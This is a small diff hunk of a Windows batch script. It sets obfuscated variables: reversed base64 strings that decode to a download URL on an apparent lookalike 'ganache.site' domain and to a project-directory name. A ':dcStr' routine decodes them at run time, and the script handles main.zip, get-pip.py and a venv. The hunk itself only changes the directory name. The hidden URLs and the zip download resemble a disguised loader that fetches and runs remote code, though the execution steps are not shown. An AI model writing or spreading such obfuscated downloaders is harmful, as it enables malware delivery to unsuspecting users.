@@ -12,7 +12,7 @@ set "GE_PI_FI=get-pip.py"
 set "AP_UR="
 set "AP_UR_EC==smbpxWLlh2Yh5WYn9iclBHblh2LxY3LpBXYvUGdpNnLlh2Yh5WYn9yL6MHc0RHa"
 set "ZI_FI=main.zip"
-set "PR_DI_EC===gbpdXL5ZWarN2bsNGa"
+set "PR_DI_EC=sF2cyVmdp5Wd"
 set "VENV_DIR=venv"
 
 call :dcStr "%PY_ZI_EC%", PY_ZI_UR
